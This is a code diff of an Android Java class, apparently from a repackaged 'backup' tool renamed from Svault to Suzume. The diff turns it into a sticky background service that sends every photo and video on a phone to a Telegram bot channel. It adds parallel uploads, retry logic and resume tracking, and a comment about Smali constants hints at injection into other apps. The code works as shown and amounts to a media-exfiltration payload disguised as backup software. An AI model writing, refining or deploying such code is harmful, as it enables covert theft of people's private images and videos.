@@ -1,159 +1,177 @@
 package com.tenix.svault;
 
-import android.Manifest;
-import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.Service;
 import android.content.ContentUris;
-import android.content.pm.PackageManager;
+import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.res.AssetFileDescriptor;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
+import android.os.IBinder;
 import android.provider.MediaStore;
-import android.widget.Toast;
 
 import java.io.DataOutputStream;
 import java.io.InputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicInteger;
 
-public class inq extends Activity {
+public class inq extends Service {
 
-    // ── CONFIG — static (NOT final) so Smali এ একটাই জায়গায় থাকে ──
+    // ── CONFIG (static — NOT final → single const-string in Smali <clinit>) ──
     static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
     static String CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
-    // ─────────────────────────────────────────────────────────────────
-    // Public channel  →  @channel_username
-    // Private channel →  -1001234567890
+    // ─────────────────────────────────────────────────────────────────────────
+    // Public channel  → @channel_username
+    // Private channel → -1001234567890
 
-    private static final int    REQ_PERM  = 1;
-    private static final int    NOTIF_ID  = 55;
-    private static final String NOTIF_CH  = "svault_upload";
-    private static final long   MAX_SIZE  = 50L * 1024 * 1024; // 50 MB
-    private static final int    DELAY_MS  = 350;
+    private static final String NOTIF_CH   = "suzume_upload";
+    private static final int    NOTIF_ID   = 55;
+    private static final long   MAX_SIZE   = 50L * 1024 * 1024; // 50 MB
+    private static final String PREFS_NAME = "suzume_done";
+    private static final String PREFS_KEY  = "ids";
+
+    private static volatile boolean running = false;
 
     private NotificationManager nm;
-    private ExecutorService     executor;
+    private ExecutorService     outer;
+    private final Object        lock = new Object();
+
+    // ── Service lifecycle ─────────────────────────────────────
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        executor = Executors.newSingleThreadExecutor();
+    public int onStartCommand(Intent intent, int flags, int startId) {
         nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         initNotifChannel();
-        askPermissions();
-    }
 
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (executor != null && !executor.isShutdown()) executor.shutdown();
-    }
-
-    // ── Permissions ───────────────────────────────────────────
-
-    @SuppressWarnings("NewApi")
-    private void askPermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            String[] perms = {
-                    Manifest.permission.READ_MEDIA_IMAGES,
-                    Manifest.permission.READ_MEDIA_VIDEO,
-                    Manifest.permission.POST_NOTIFICATIONS
-            };
-            boolean all = true;
-            for (String p : perms)
-                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
-                    all = false; break;
-                }
-            if (!all) requestPermissions(perms, REQ_PERM);
-            else      startUpload();
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
-                    != PackageManager.PERMISSION_GRANTED)
-                requestPermissions(
-                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
-            else startUpload();
+        // Must call startForeground within 5 s
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIF_ID, buildNotif("Suzume starting…", 0, 0, 0),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
         } else {
-            startUpload();
+            startForeground(NOTIF_ID, buildNotif("Suzume starting…", 0, 0, 0));
         }
+
+        if (running) return START_STICKY; // already in progress
+        running = true;
+
+        outer = Executors.newSingleThreadExecutor();
+        outer.execute(() -> {
+            try { runUpload(); }
+            finally { running = false; stopSelf(); }
+        });
+
+        return START_STICKY; // restart if killed → resumes from saved progress
     }
 
     @Override
-    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
-        if (code != REQ_PERM) return;
-        for (int i = 0; i < perms.length; i++) {
-            String p = perms[i];
-            if (results[i] == PackageManager.PERMISSION_GRANTED
-                    && (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
-                     || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
-                startUpload(); return;
-            }
-        }
-        Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
-        finish();
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (outer != null) outer.shutdownNow();
     }
 
-    // ── Upload flow ───────────────────────────────────────────
+    // ── Main upload flow ──────────────────────────────────────
 
-    private void startUpload() {
-        executor.execute(() -> {
+    private void runUpload() {
 
-            // Step 1: Bot token check
-            String[] r1 = new String[1];
-            int meCode = getMe(r1);
-            if (meCode != 200) {
-                errorNotif("❌ Bot token invalid!\nCode: " + meCode + "\n" + r1[0]);
-                return;
-            }
+        // 1 — verify bot token
+        String[] r1 = {""};
+        if (getMe(r1) != 200) {
+            errorNotif("❌ Bot token invalid!\n" + r1[0]); return;
+        }
 
-            // Step 2: Channel access check
-            String[] r2 = new String[1];
-            int msgCode = sendText("🔵 Svault backup started", r2);
-            if (msgCode != 200) {
-                errorNotif("❌ Channel error!\nID: " + CHANNEL_ID
-                        + "\nCode: " + msgCode + "\n" + r2[0]);
-                return;
-            }
+        // 2 — verify channel
+        String[] r2 = {""};
+        int ch = sendText("🔵 Suzume backup started", r2);
+        if (ch != 200) {
+            errorNotif("❌ Channel error!\nID: " + CHANNEL_ID + "\nCode: " + ch + "\n" + r2[0]);
+            return;
+        }
 
-            // Step 3: Upload files
-            ArrayList<Uri> all = collectMedia();
-            int total = all.size();
-            if (total == 0) { infoNotif("No media found."); return; }
+        // 3 — collect + filter already-done
+        ArrayList<Uri> all = collectMedia();
+        Set<String> done = getDoneIds();
+        ArrayList<Uri> pending = new ArrayList<>();
+        for (Uri u : all) {
+            if (!done.contains(String.valueOf(ContentUris.parseId(u)))) pending.add(u);
+        }
 
-            int ok = 0, skipped = 0;
-            for (int i = 0; i < total; i++) {
-                Uri uri = all.get(i);
+        int total     = pending.size();
+        int alreadyOk = all.size() - total;
+        AtomicInteger processed = new AtomicInteger(0);
+        AtomicInteger succeeded = new AtomicInteger(0);
+        AtomicInteger skipped   = new AtomicInteger(0);
+
+        if (total == 0) {
+            doneNotif(alreadyOk, all.size(), 0); return;
+        }
+
+        // 4 — 2 parallel upload threads (fastest safe rate for Telegram)
+        ExecutorService pool = Executors.newFixedThreadPool(2);
+        for (Uri uri : pending) {
+            pool.submit(() -> {
                 if (getFileSize(uri) > MAX_SIZE) {
-                    skipped++;
-                    pushNotif(i + 1, total, ok);
-                    continue;
+                    skipped.incrementAndGet();
+                } else {
+                    int code = uploadWithRetry(uri);
+                    if (code == 200) {
+                        succeeded.incrementAndGet();
+                        markDone(ContentUris.parseId(uri));
+                    }
                 }
-                if (sendDocument(uri)) ok++;
-                pushNotif(i + 1, total, ok);
-                try { Thread.sleep(DELAY_MS); } catch (InterruptedException ignored) {}
+                int cur = processed.incrementAndGet();
+                updateNotif(cur, total, succeeded.get() + alreadyOk);
+            });
+        }
+
+        pool.shutdown();
+        try { pool.awaitTermination(24, TimeUnit.HOURS); }
+        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+
+        doneNotif(succeeded.get() + alreadyOk, all.size(), skipped.get());
+    }
+
+    // ── Upload with retry + 429 backoff ───────────────────────
+
+    private int uploadWithRetry(Uri uri) {
+        for (int attempt = 0; attempt < 3; attempt++) {
+            int code = sendDocument(uri);
+            if (code == 200) return 200;
+            if (code == 429) {
+                // Rate limited — back off
+                try { Thread.sleep(5000L * (attempt + 1)); }
+                catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
+            } else if (code >= 500) {
+                try { Thread.sleep(2000); }
+                catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
+            } else {
+                return code; // 400/404 — no point retrying
             }
-            doneNotif(ok, total, skipped);
-        });
+        }
+        return -1;
     }
 
     // ── Telegram: getMe ───────────────────────────────────────
 
     private int getMe(String[] out) {
         try {
-            HttpURLConnection c = (HttpURLConnection)
-                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe")
-                    .openConnection();
-            c.setConnectTimeout(15_000);
-            c.setReadTimeout(15_000);
+            HttpURLConnection c = open(
+                    "https://api.telegram.org/bot" + BOT_TOKEN + "/getMe", 15_000);
             int code = c.getResponseCode();
-            out[0] = drain(c, code);
-            c.disconnect();
+            out[0] = drain(c, code); c.disconnect();
             return code;
         } catch (Exception e) { out[0] = e.getMessage(); return -1; }
     }
@@ -162,13 +180,8 @@ public class inq extends Activity {
 
     private int sendText(String text, String[] out) {
         try {
-            HttpURLConnection c = (HttpURLConnection)
-                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
-                    .openConnection();
-            c.setRequestMethod("POST");
-            c.setDoOutput(true);
-            c.setConnectTimeout(15_000);
-            c.setReadTimeout(15_000);
+            HttpURLConnection c = openPost(
+                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", 15_000);
             c.setRequestProperty("Content-Type",
                     "application/x-www-form-urlencoded; charset=UTF-8");
             String body = "chat_id=" + enc(CHANNEL_ID) + "&text=" + enc(text);
@@ -177,85 +190,45 @@ public class inq extends Activity {
             DataOutputStream o = new DataOutputStream(c.getOutputStream());
             o.write(bytes); o.flush(); o.close();
             int code = c.getResponseCode();
-            out[0] = drain(c, code);
-            c.disconnect();
+            out[0] = drain(c, code); c.disconnect();
             return code;
         } catch (Exception e) { out[0] = e.getMessage(); return -1; }
     }
 
-    // ── Telegram: sendDocument (with real filename + extension) ─
+    // ── Telegram: sendDocument ────────────────────────────────
 
-    private boolean sendDocument(Uri uri) {
+    private int sendDocument(Uri uri) {
         try {
-            String mime     = getContentResolver().getType(uri);
+            String mime  = getContentResolver().getType(uri);
             if (mime == null) mime = "application/octet-stream";
-            String filename = getFileName(uri, mime);  // ← real name.jpg / name.mp4
-            String bound    = "SVB" + System.currentTimeMillis();
+            String fname = getFileName(uri, mime);
+            String bound = "SZB" + System.currentTimeMillis();
 
-            HttpURLConnection c = (HttpURLConnection)
-                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
-                    .openConnection();
-            c.setRequestMethod("POST");
-            c.setDoOutput(true);
-            c.setDoInput(true);
-            c.setConnectTimeout(30_000);
-            c.setReadTimeout(180_000);
+            HttpURLConnection c = openPost(
+                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", 180_000);
             c.setRequestProperty("Content-Type",
                     "multipart/form-data; boundary=" + bound);
             c.setRequestProperty("Connection", "close");
 
             DataOutputStream out = new DataOutputStream(c.getOutputStream());
-            // chat_id
             out.writeBytes("--" + bound + "\r\n");
             out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
             out.writeBytes(CHANNEL_ID + "\r\n");
-            // document with real filename
             out.writeBytes("--" + bound + "\r\n");
             out.writeBytes("Content-Disposition: form-data; "
-                    + "name=\"document\"; filename=\"" + filename + "\"\r\n");
+                    + "name=\"document\"; filename=\"" + fname + "\"\r\n");
             out.writeBytes("Content-Type: " + mime + "\r\n\r\n");
             try (InputStream in = getContentResolver().openInputStream(uri)) {
-                byte[] buf = new byte[8192]; int n;
+                byte[] buf = new byte[16384]; int n;
                 if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
             }
             out.writeBytes("\r\n--" + bound + "--\r\n");
             out.flush(); out.close();
 
             int code = c.getResponseCode();
-            drain(c, code);
-            c.disconnect();
-            return code == 200;
-        } catch (Exception e) { return false; }
-    }
-
-    // ── Get real filename with extension ──────────────────────
-
-    private String getFileName(Uri uri, String mime) {
-        // Try MediaStore display name first
-        try (Cursor c = getContentResolver().query(
-                uri,
-                new String[]{MediaStore.MediaColumns.DISPLAY_NAME},
-                null, null, null)) {
-            if (c != null && c.moveToFirst()) {
-                String name = c.getString(0);
-                if (name != null && !name.isEmpty()) return name;
-            }
-        } catch (Exception ignored) {}
-
-        // Fallback: build from timestamp + mime extension
-        String ext = "";
-        if (mime != null) {
-            if (mime.equals("image/jpeg"))            ext = ".jpg";
-            else if (mime.equals("image/png"))        ext = ".png";
-            else if (mime.equals("image/gif"))        ext = ".gif";
-            else if (mime.equals("image/webp"))       ext = ".webp";
-            else if (mime.equals("image/heic"))       ext = ".heic";
-            else if (mime.equals("video/mp4"))        ext = ".mp4";
-            else if (mime.equals("video/3gpp"))       ext = ".3gp";
-            else if (mime.equals("video/quicktime"))  ext = ".mov";
-            else if (mime.equals("video/x-matroska")) ext = ".mkv";
-        }
-        return "media_" + System.currentTimeMillis() + ext;
+            drain(c, code); c.disconnect();
+            return code;
+        } catch (Exception e) { return -1; }
     }
 
     // ── Media scanning ────────────────────────────────────────
@@ -284,22 +257,76 @@ public class inq extends Activity {
     private long getFileSize(Uri uri) {
         try {
             AssetFileDescriptor a = getContentResolver().openAssetFileDescriptor(uri, "r");
-            if (a != null) { long s = a.getLength(); a.close(); return s; }
+            if (a != null) { long s = a.getLength(); a.close(); return Math.max(s, 0); }
         } catch (Exception ignored) {}
         return 0;
     }
 
-    // ── Helpers ───────────────────────────────────────────────
+    private String getFileName(Uri uri, String mime) {
+        try (Cursor c = getContentResolver().query(uri,
+                new String[]{MediaStore.MediaColumns.DISPLAY_NAME}, null, null, null)) {
+            if (c != null && c.moveToFirst()) {
+                String n = c.getString(0);
+                if (n != null && !n.isEmpty()) return n;
+            }
+        } catch (Exception ignored) {}
+        String ext = "";
+        if (mime != null) switch (mime) {
+            case "image/jpeg":            ext = ".jpg"; break;
+            case "image/png":             ext = ".png"; break;
+            case "image/gif":             ext = ".gif"; break;
+            case "image/webp":            ext = ".webp"; break;
+            case "image/heic":            ext = ".heic"; break;
+            case "video/mp4":             ext = ".mp4"; break;
+            case "video/3gpp":            ext = ".3gp"; break;
+            case "video/quicktime":       ext = ".mov"; break;
+            case "video/x-matroska":      ext = ".mkv"; break;
+        }
+        return "media_" + System.currentTimeMillis() + ext;
+    }
+
+    // ── Progress persistence (resume support) ─────────────────
+
+    private Set<String> getDoneIds() {
+        synchronized (lock) {
+            return new HashSet<>(getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+                    .getStringSet(PREFS_KEY, new HashSet<>()));
+        }
+    }
+
+    private void markDone(long id) {
+        synchronized (lock) {
+            SharedPreferences p = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+            Set<String> ids = new HashSet<>(p.getStringSet(PREFS_KEY, new HashSet<>()));
+            ids.add(String.valueOf(id));
+            p.edit().putStringSet(PREFS_KEY, ids).apply();
+        }
+    }
+
+    // ── HTTP helpers ──────────────────────────────────────────
+
+    private HttpURLConnection open(String url, int timeout) throws Exception {
+        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+        c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
+        return c;
+    }
+
+    private HttpURLConnection openPost(String url, int readTimeout) throws Exception {
+        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+        c.setRequestMethod("POST");
+        c.setDoOutput(true); c.setDoInput(true);
+        c.setConnectTimeout(30_000); c.setReadTimeout(readTimeout);
+        return c;
+    }
 
     private String drain(HttpURLConnection c, int code) {
         try {
-            InputStream s = (code == 200) ? c.getInputStream() : c.getErrorStream();
+            InputStream s = code == 200 ? c.getInputStream() : c.getErrorStream();
             if (s == null) return "";
             StringBuilder sb = new StringBuilder();
             byte[] buf = new byte[1024]; int n;
             while ((n = s.read(buf)) != -1) sb.append(new String(buf, 0, n, "UTF-8"));
-            s.close();
-            return sb.toString();
+            s.close(); return sb.toString();
         } catch (Exception e) { return ""; }
     }
 
@@ -313,7 +340,26 @@ public class inq extends Activity {
     private void initNotifChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
             nm.createNotificationChannel(new NotificationChannel(
-                    NOTIF_CH, "Svault Upload", NotificationManager.IMPORTANCE_LOW));
+                    NOTIF_CH, "Suzume Upload", NotificationManager.IMPORTANCE_LOW));
+    }
+
+    @SuppressWarnings("deprecation")
+    private Notification buildNotif(String title, int cur, int total, int ok) {
+        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                ? new Notification.Builder(this, NOTIF_CH)
+                : new Notification.Builder(this);
+        b.setSmallIcon(android.R.drawable.ic_menu_upload)
+         .setContentTitle(title)
+         .setOngoing(true);
+        if (total > 0) {
+            b.setContentText(cur + " / " + total + "   ✓ " + ok);
+            b.setProgress(total, cur, false);
+        }
+        return b.build();
+    }
+
+    private void updateNotif(int cur, int total, int ok) {
+        nm.notify(NOTIF_ID, buildNotif("Suzume — uploading", cur, total, ok));
     }
 
     @SuppressWarnings("deprecation")
@@ -322,32 +368,11 @@ public class inq extends Activity {
                 ? new Notification.Builder(this, NOTIF_CH)
                 : new Notification.Builder(this);
         b.setSmallIcon(android.R.drawable.ic_dialog_alert)
-         .setContentTitle("Svault — Error")
+         .setContentTitle("Suzume — Error")
          .setStyle(new Notification.BigTextStyle().bigText(msg))
-         .setContentText(msg).setAutoCancel(true);
+         .setContentText(msg).setAutoCancel(true).setOngoing(false);
         nm.notify(NOTIF_ID, b.build());
-    }
-
-    @SuppressWarnings("deprecation")
-    private void infoNotif(String msg) {
-        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                ? new Notification.Builder(this, NOTIF_CH)
-                : new Notification.Builder(this);
-        b.setSmallIcon(android.R.drawable.ic_menu_info_details)
-         .setContentTitle("Svault").setContentText(msg).setAutoCancel(true);
-        nm.notify(NOTIF_ID, b.build());
-    }
-
-    @SuppressWarnings("deprecation")
-    private void pushNotif(int cur, int total, int ok) {
-        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                ? new Notification.Builder(this, NOTIF_CH)
-                : new Notification.Builder(this);
-        b.setSmallIcon(android.R.drawable.ic_menu_upload)
-         .setContentTitle("Svault — uploading  ✓ " + ok)
-         .setContentText(cur + " / " + total)
-         .setProgress(total, cur, false).setOngoing(true);
-        nm.notify(NOTIF_ID, b.build());
+        stopForeground(true);
     }
 
     @SuppressWarnings("deprecation")
@@ -358,8 +383,9 @@ public class inq extends Activity {
                 ? new Notification.Builder(this, NOTIF_CH)
                 : new Notification.Builder(this);
         b.setSmallIcon(android.R.drawable.ic_menu_upload)
-         .setContentTitle("Svault — complete")
+         .setContentTitle("Suzume — complete")
          .setContentText(text).setAutoCancel(true).setOngoing(false);
         nm.notify(NOTIF_ID, b.build());
+        stopForeground(true);
     }
 }
